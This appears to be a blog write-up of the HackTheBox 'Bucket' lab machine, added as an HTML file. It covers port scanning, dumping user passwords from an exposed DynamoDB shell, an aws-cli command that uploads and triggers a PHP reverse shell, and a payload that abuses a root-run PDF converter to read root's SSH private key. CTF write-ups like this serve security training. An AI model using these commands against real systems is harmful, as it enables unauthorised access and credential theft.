@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Bucket HTB Writeup">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Bucket HacktheBox Writeup"/>
+<meta name="twitter:description" content="Bucket HTB Writeup"/>
+
+    <meta property="og:title" content="Bucket HacktheBox Writeup" />
+<meta property="og:description" content="Bucket HTB Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/bucket/" />
+<meta property="article:published_time" content="2021-03-08T18:26:11+05:30" />
+<meta property="article:modified_time" content="2021-03-08T18:26:11+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/passage/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/scriptkiddie/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/luanne/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/delivery/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/doctor/" />
+
+
+
+    <title>
+  Bucket HacktheBox Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/bucket/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">$ whoami</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Bucket HacktheBox Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-03-08T18:26:11&#43;05:30'>
+                March 8, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/hackthebox/">HackTheBox</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/htb/">htb</a>
+      <span class="separator">•</span>
+    <a href="/tags/medium_box/">medium_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="bucket-hackthebox-writeup">Bucket HackTheBox Writeup</h1>
+<p><img src="/HackTheBox/Bucket/BoxImage.webp" alt=""></p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>So first add the IP address in <strong>/etc/hosts</strong> as <strong>bucket.htb</strong>
+As usual we start with nmap scan.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Wed Mar  3 21:57:48 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.10.212
+Nmap scan report for 10.10.10.212
+Host is up, received reset ttl 63 (0.23s latency).
+Scanned at 2021-03-03 21:57:49 IST for 249s
+Not shown: 65533 closed ports
+Reason: 65533 resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
+|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>So let&rsquo;s visit port 80</p>
+<p><img src="/HackTheBox/Bucket/port80.png" alt=""></p>
+<p>In viewing the source code of the website we can see the s3 bucket.</p>
+<p><img src="/HackTheBox/Bucket/sourcecode.png" alt=""></p>
+<p>Hence let&rsquo;s add s3.bucket.htb in <strong>/etc/hosts</strong> file and visit it.</p>
+<p>By visiting the website we get a simple web page showing us that the bucket is running.</p>
+<p><img src="/HackTheBox/Bucket/s3bucket.png" alt=""></p>
+<p>So I started gobuster .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://s3.bucket.htb/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     js,txt,html,php,zip,json
+[+] Timeout:        10s
+===============================================================
+2021/03/04 12:51:53 Starting gobuster
+===============================================================
+/shell (Status: 200)
+/health (Status: 200)
+/server-status (Status: 403)
+===============================================================
+</code></pre></div><p>Hence by visiting /health directory we can see that dynamodb is running. And by visiting /shell/
+we get the <strong>AWS Console</strong>.</p>
+<p><img src="/HackTheBox/Bucket/javascript.png" alt=""></p>
+<h2 id="__second-stage--initial-access-as-www-data__"><strong>Second Stage : Initial access as www-data</strong></h2>
+<p>So after doing some research on dynamo db I got to know some code in order to get the details of the database.</p>
+<p>So the code for listing tables is :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var params = {
+ };
+ dynamodb.listTables(params, function(err, data) {
+   if (err) console.log(err, err.stack); // an error occurred
+   else     console.log(data);           // successful response
+   
+ });
+</code></pre></div><p><img src="/HackTheBox/Bucket/list_table.png" alt=""></p>
+<p>So the table name is <strong>users</strong>.</p>
+<p>Hence we can describe the table in order to see the columns.</p>
+<p>Code for describing table is :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var params = {
+  TableName: &#34;users&#34;
+ };
+ dynamodb.describeTable(params, function(err, data) {
+   if (err) console.log(err, err.stack); // an error occurred
+   else     console.log(data);           // successful response
+   
+   
+ });
+</code></pre></div><p><img src="/HackTheBox/Bucket/describe_table.png" alt="">
+So the table contains username and password.</p>
+<p>Let&rsquo;s scan the table for listing the contents</p>
+<p>So the code for scanning is :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
+var params = {
+  TableName: &#34;users&#34;
+ };
+dynamodb.scan(params, function(err, data) {
+    if (err) ppJson(err); // an error occurred
+    else ppJson(data); // successful response
+});
+</code></pre></div><p><img src="/HackTheBox/Bucket/passwords.png" alt=""></p>
+<p>Hence we got the password and username I saved it for later.</p>
+<p>So using the aws-cli for linux I started enumerating about the server</p>
+<p><img src="/HackTheBox/Bucket/enumadserv.png" alt=""></p>
+<p>So seeing the help command we can see we can copy files from local directory to the server.
+<img src="/HackTheBox/Bucket/help.png" alt=""></p>
+<p>So using this we can upload php reverse shell to the machine and get a shell.</p>
+<blockquote>
+<p>aws &ndash;endpoint-url <a href="http://s3.bucket.htb">http://s3.bucket.htb</a> s3 cp revshell.php s3://adserver/revshell.php &amp;&amp; curl <a href="http://bucket.htb/revshell.php">http://bucket.htb/revshell.php</a> &amp;&gt; /dev/null</p>
+</blockquote>
+<p><img src="/HackTheBox/Bucket/upandexec.png" alt="">
+<img src="/HackTheBox/Bucket/wwdata.png" alt=""></p>
+<h2 id="__third-stage--www-data-to-roy__"><strong>Third Stage : www-data to roy</strong></h2>
+<p>After running linpeas and manual enumeration I didn&rsquo;t find anything interesting.
+Hence I tried the passwords we got in database on user roy and one of them worked.</p>
+<h2 id="__fourth-stage--roy-to-root__"><strong>Fourth Stage : roy to root</strong></h2>
+<p>So user roy didn&rsquo;t have any sudo permissions.</p>
+<p>Hence analyzing the open ports we get something interesting.</p>
+<p><img src="/HackTheBox/Bucket/openports.png" alt=""></p>
+<p>So portforwarding 8000 we can see a web server running.</p>
+<p><img src="/HackTheBox/Bucket/serv.png" alt="">
+<img src="/HackTheBox/Bucket/client.png" alt=""></p>
+<p><img src="/HackTheBox/Bucket/inserv.png" alt=""></p>
+<p>So running gobuster gave me a hint where this web server is located in the box.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://localhost:8000/
+[+] Threads:        30
+[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     json,js,txt,html,php,zip
+[+] Timeout:        10s
+===============================================================
+2021/03/04 15:16:22 Starting gobuster
+===============================================================
+/files (Status: 301)
+/index.php (Status: 200)
+/vendor (Status: 301)
+/server-status (Status: 200)
+===============================================================
+</code></pre></div><p>So searching for vendor directory we get the location</p>
+<p><img src="/HackTheBox/Bucket/location.png" alt=""></p>
+<p>So visiting the <strong>/var/www/bucket-app</strong> we can see the  server.</p>
+<p>Inspecting the first few lines of  index.php we get some info.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;?php
+require &#39;vendor/autoload.php&#39;;
+use Aws\DynamoDb\DynamoDbClient;
+if($_SERVER[&#34;REQUEST_METHOD&#34;]===&#34;POST&#34;) {
+	if($_POST[&#34;action&#34;]===&#34;get_alerts&#34;) {
+		date_default_timezone_set(&#39;America/New_York&#39;);
+		$client = new DynamoDbClient([
+			&#39;profile&#39; =&gt; &#39;default&#39;,
+			&#39;region&#39;  =&gt; &#39;us-east-1&#39;,
+			&#39;version&#39; =&gt; &#39;latest&#39;,
+			&#39;endpoint&#39; =&gt; &#39;http://localhost:4566&#39;
+		]);
+
+		$iterator = $client-&gt;getIterator(&#39;Scan&#39;, array(
+			&#39;TableName&#39; =&gt; &#39;alerts&#39;,
+			&#39;FilterExpression&#39; =&gt; &#34;title = :title&#34;,
+			&#39;ExpressionAttributeValues&#39; =&gt; array(&#34;:title&#34;=&gt;array(&#34;S&#34;=&gt;&#34;Ransomware&#34;)),
+		));
+
+		foreach ($iterator as $item) {
+			$name=rand(1,10000).&#39;.html&#39;;
+			file_put_contents(&#39;files/&#39;.$name,$item[&#34;data&#34;]);
+		}
+		passthru(&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf&#34;);
+	}
+}
+else
+{
+?&gt;
+</code></pre></div><p>We can see that the code searches for a table name alerts , in that table is searches for the
+<strong>Ransomware</strong> and converts the column into PDF format and stores in  /var/www/bucket-app/files/.
+All these process are running in root.</p>
+<p>Exploit :
+So to exploit this let&rsquo;s create a table named alerts and create a column named <strong>Ransomware</strong> in
+that we will try to get the private key of the root.</p>
+<p>Command for creating alerts table :</p>
+<blockquote>
+<p>aws dynamodb create-table &ndash;table-name alerts &ndash;attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S &ndash;key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE &ndash;provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 &ndash;endpoint-url <a href="http://s3.bucket.htb">http://s3.bucket.htb</a></p>
+</blockquote>
+<p><img src="/HackTheBox/Bucket/createalerts.png" alt=""></p>
+<p>Command for payload is :</p>
+<blockquote>
+<p>aws dynamodb put-item &ndash;table-name alerts &ndash;item &lsquo;{&ldquo;title&rdquo;: {&ldquo;S&rdquo;: &ldquo;Ransomware&rdquo;},&ldquo;data&rdquo;: {&ldquo;S&rdquo;: &ldquo;<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;}}&rsquo; &ndash;endpoint-url <a href="http://s3.bucket.htb">http://s3.bucket.htb</a></p>
+</blockquote>
+<p><img src="/HackTheBox/Bucket/payload.png" alt=""></p>
+<p>To trigger the payload do this</p>
+<p><img src="/HackTheBox/Bucket/exploit.png" alt=""></p>
+<p>So we copy the pdf to our local machine .</p>
+<p><img src="/HackTheBox/Bucket/rsakey.png" alt="">
+since we get the key we can ssh into the machine as root.</p>
+<p><img src="/HackTheBox/Bucket/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in HackTheBox</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/passage/">Passage HackTheBox Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/scriptkiddie/">ScriptKiddie HacktheBox Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/luanne/">Luanne HackTheBox Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/delivery/">Delivery HackTheBox Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/doctor/">Doctor HacktheBox Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
